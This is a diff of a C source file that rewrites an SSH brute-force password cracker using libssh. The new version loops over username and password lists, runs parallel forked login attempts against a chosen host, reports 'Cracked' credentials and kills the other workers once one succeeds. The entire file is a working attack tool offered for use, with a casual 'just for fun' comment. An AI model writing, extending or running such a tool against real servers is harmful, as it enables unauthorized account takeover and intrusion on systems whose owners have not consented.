@@ -1,225 +1,191 @@
-/*
+// gcc brute_ssh.c -o brute-ssh -lssh
+// I know brute ssh is wast of time
+// I update this just for fun
 
- SSH Brute-force in C !
- C0d3r: MMxM
- Blog: hc0der.blogspot.com
- Twitter: @hc0d3r
-
- Compiling:
-
-$ gcc brute_ssh.c -o ssh_brute -lssh
-
- Executing:
-
-$ ./ssh_brute -x localhost -u root -w wordlist.txt -t 20
-
-
-Note: you need libssh to compile it
-# apt-get install libssh-dev
-
-_( R </3 )_
-
-*/
+#include <libssh/libssh.h>
+#include <sys/wait.h>
 
 #include <stdio.h>
-#include <errno.h>
 #include <unistd.h>
 #include <stdlib.h>
-#include <sys/wait.h>
-#include <sys/types.h>
-#include <sys/mman.h>
-#include <libssh/libssh.h>
-#include <string.h>
 #include <getopt.h>
 #include <signal.h>
 
-static int *cracked;
+typedef struct {
+    char *ptr;
+    size_t len;
+} line_t;
 
-char *USER = NULL;
-char *HOST = NULL;
+char *target;
 
+int ssh_login(const char *user, const char *passwd){
+    ssh_session ssh_id;
+    int ret = 0;
 
-int ssh_brute(const char *passwd_s){
-	if(*cracked == 1) exit(0);
-	printf("[*] Testing [%s: %s]\n",USER,passwd_s);
-	ssh_session ssh_id;
-	ssh_id = ssh_new();
-	int check;
-	ssh_options_set(ssh_id,SSH_OPTIONS_HOST, HOST);
-	ssh_options_set(ssh_id,SSH_OPTIONS_USER, USER);
+    printf("[*] testing => %s:%s:%s\n", target, user, passwd);
 
-	if((check = ssh_connect(ssh_id)) != SSH_OK){
-		ssh_free(ssh_id);
-		return(-1);
-	}
+    ssh_id = ssh_new();
+    ssh_options_set(ssh_id, SSH_OPTIONS_HOST, target);
+    ssh_options_set(ssh_id, SSH_OPTIONS_USER, user);
 
-	if((check = ssh_userauth_password(ssh_id, NULL,passwd_s)) != SSH_AUTH_SUCCESS){
-		ssh_free(ssh_id);
-		return(-1);
-	}
+    if(ssh_connect(ssh_id) != SSH_OK){
+        goto end;
+    }
 
-	ssh_disconnect(ssh_id);
-	ssh_free(ssh_id);
-	*cracked = 1;
-	printf("\n\n\tCracked --> [%s : %s]\n\n",USER,passwd_s);
-	return(0);
+    if(ssh_userauth_password(ssh_id, NULL, passwd) != SSH_AUTH_SUCCESS){
+        goto end;
+    }
+
+    printf("\n\n\tCracked --> [%s : %s]\n\n", user, passwd);
+
+    ret = 1;
+
+    end:
+    ssh_disconnect(ssh_id);
+    ssh_free(ssh_id);
+
+    return ret;
 }
 
-void help_x (void){
-	fprintf(stderr,"\n[+] SSH Crack by MMxM\n\n");
-	fprintf(stderr," Options:\n\n");
-	fprintf(stderr,"\t-x <target_host>\n");
-	fprintf(stderr,"\t-u <user>\n");
-	fprintf(stderr,"\t-w <wordlist_file>\n");
-	fprintf(stderr,"\t-t <Threads_number> default: 10\n\n");
-	exit(1);
+void help(void){
+    const char *banner=
+        "brute-ssh [OPTIONS] [TARGET]\n\n"
+        "Options:\n"
+        " -u FILE      Username list\n"
+        " -p FILE      Password list\n"
+        " -t NUMBER    Number of simultaneous connections";
+
+    puts(banner);
+    exit(0);
 }
 
 int main(int argc,char **argv){
-	cracked = mmap(NULL, sizeof *cracked, PROT_READ | PROT_WRITE,
-		MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	*cracked = 0;
+    char *userlist, *pwlist;
+    FILE *ufh, *pfh;
+
+    int threads, nthreads, opt, i, status;
+    pid_t *pid, res;
+
+    ssize_t npw, nuser;
+    line_t pline, uline;
+
+    userlist = pwlist = NULL;
+
+    // default thread number
+    threads = 10;
+
+    while((opt = getopt(argc, argv, "u:p:t:")) != -1){
+        switch(opt){
+            case 'u':
+                userlist = optarg;
+                break;
+            case 'p':
+                pwlist = optarg;
+                break;
+            case 't':
+                threads = atoi(optarg);
+                break;
+            default:
+                return 1;
+        }
+    }
+
+    target = argv[optind];
+
+    if(!target || !threads || !userlist || !pwlist){
+        help();
+    }
+
+    if((pid = calloc(threads, sizeof(pid_t))) == NULL){
+        perror("calloc()");
+        return 1;
+    }
+
+    if((pfh = fopen(pwlist, "r")) == NULL){
+        perror("fopen()");
+        return 1;
+    }
+
+    if((ufh = fopen(userlist, "r")) == NULL){
+        perror("fopen()");
+        return 1;
+    }
 
 
-	int THREADS = 10, check_h = 0,
-	j = 0, i = 0, opts;
+    pline.ptr = uline.ptr = NULL;
+    pline.len = uline.len = 0;
+    nthreads = i = 0;
 
-	char *file_name = NULL;
+    printf("[+] starting ...\n");
 
-	while((opts = getopt (argc, argv, "x:u:t:w:h")) != -1){
-		switch(opts){
-			case 'h':
-				check_h = 1;
-				break;
-			case 'x':
-				HOST = optarg;
-				break;
-			case 'w':
-				file_name = optarg;
-				break;
-			case 'u':
-				USER = optarg;
-				break;
-			case 't':
-				THREADS = atoi(optarg);
-			case '?':
-				if(optopt == 'w')
-					fprintf(stderr, "Option -w requires an argument.\n");
-				else if(optopt == 'x')
-					fprintf(stderr, "Option -x requires an argument.\n");
-				else if(optopt == 'u')
-					fprintf(stderr, "Option -u requires an argument.\n");
-				else if(optopt == 't')
-					fprintf(stderr, "Option -t requires an argument.\n");
-				else if(optopt == 0)
-					break;
-				else
-					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
-				return 1;
-			default:
-				abort();
-		}
-	}
+    while((npw = getline(&pline.ptr, &pline.len, pfh)) > 0){
+        // skip blank lines
+        if(npw == 1 && pline.ptr[0] == '\n')
+            continue;
 
-	if(check_h == 1) help_x();
+        // chomp
+        if(pline.ptr[npw-1] == '\n')
+            pline.ptr[npw-1] = 0x0;
 
-	if(HOST == NULL || file_name == NULL || USER == NULL){
-		fprintf(stderr,"ssh-brute: try 'ssh_brute -h' for more information\n");
-		return(1);
-	}
+        while((nuser = getline(&uline.ptr, &uline.len, ufh)) > 0){
+            if(nuser == 1 && uline.ptr[0] == '\n')
+                continue;
 
-	pid_t pids[THREADS];
+            if(uline.ptr[nuser-1] == '\n')
+                uline.ptr[nuser-1] = 0x0;
 
-	for(i=0;i<THREADS;i++){
-		pids[i] = 0;
-	}
+            // get next free position
+            for(i=0; pid[i]; i++);
 
-	pid_t tmp;
+            pid[i] = fork();
+            if(pid[i] == -1){
+                // probably resource exhaustion
+                perror("fork()");
+                goto join;
+            } else if(pid[i] == 0){
+                _exit(ssh_login(uline.ptr, pline.ptr));
+            }
 
-	FILE *wordlist;
+            nthreads++;
 
-	char C;
+            // maximum number of parallel process reachead
+            // wait until a process finish
+            while(threads == nthreads){
+                res = waitpid(-1, &status, 0);
+                nthreads--;
 
-	wordlist = fopen(file_name,"r");
-	if(wordlist == NULL){
-		fprintf(stderr,"Error to read file: %s\n",strerror(errno));
-		return(1);
-	}
+                // terminate all process if success
+                if(status){
+                    for(i=0; i<threads; i++){
+                        if(pid[i])
+                            kill(pid[i], SIGKILL);
+                    }
+                    goto end;
+                }
 
-	int line = 0,maxsize = 0,t = 0;
+                // get the position of the finished process
+                for(i=0; pid[i] != res; i++);
+                pid[i] = 0;
 
-	while( (C = fgetc(wordlist)) != EOF ){
-		if(C=='\n'){
-			if(t>maxsize)
-				maxsize = t;
-			t = 0;
-			line++;
-		}
-		t++;
-	}
+            }
+        }
 
-	char Password[maxsize];
+        rewind(ufh);
+    }
 
-	fseek(wordlist,0,SEEK_SET);
-	int pos = 0;
+    join:
+    while(waitpid(-1, &status, 0) != -1){
+        if(status){
+            for(i=0; i<threads; i++){
+                if(pid[i]){
+                    kill(pid[i], SIGKILL);
+                    break;
+                }
+            }
+        }
+    }
 
-	printf("\n[+] Starting Attack\n");
-	printf("[*] Host: %s\n",HOST);
-	printf("[*] User: %s\n",USER);
-	printf("[*] Wordlist: %s\n\n",file_name);
-
-	while( (C = fgetc(wordlist)) != EOF ){
-
-		if(C=='\n'){
-			Password[pos] = '\0';
-			pos = 0;
-
-			tmp = fork();
-
-			if(tmp){
-				pids[j] = tmp;
-			} else if(tmp == 0){
-				ssh_brute(Password);
-				exit(0);
-			} else {
-				fprintf(stderr,"\n\t[-] Fork Failed!\n\n");
-			}
-			j++;
-
-			if(j==THREADS){
-				for(i=0;i<THREADS;i++){
-					waitpid(pids[i],NULL,0);
-				}
-
-				for(i=0;i<THREADS;i++){
-					pids[i] = 0;
-				}
-				j = 0;
-
-			}
-
-		} else {
-			Password[pos] = C;
-			pos++;
-		}
-
-		if(*cracked == 1){
-			for(i=0;i<THREADS;i++){
-				if(pids[i] == 0) continue;
-				kill(pids[THREADS],SIGTERM);
-			}
-			break;
-		}
-
-
-	}
-
-	fclose(wordlist);
-
-	for(i=0;i<THREADS;i++){
-		waitpid(pids[i],NULL,0);
-	}
-
-	printf("\n[+] 100%% complete =)\n\n");
-	return(0);
+    end:
+    printf("[+] finish\n");
+    return 0;
 }
